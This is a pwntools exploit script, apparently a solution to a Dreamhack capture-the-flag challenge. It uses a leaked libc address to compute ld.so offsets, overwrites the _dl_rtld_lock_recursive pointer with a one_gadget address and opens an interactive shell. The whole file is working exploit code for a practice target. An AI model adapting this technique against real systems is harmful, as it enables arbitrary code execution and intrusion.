from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 13207
r = remote(HOST, PORT)

r.recvuntil(b': ')

libc = int(r.recvline().strip().decode(), 16) - 0x3c5620
ld = libc+0x3ca000
rtld_global = ld+0x226040
dl_rtld_lock_recursive = rtld_global+3848
sh=libc+0xf1247

r.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
r.sendlineafter(b'value: ', str(sh).encode())

r.interactive()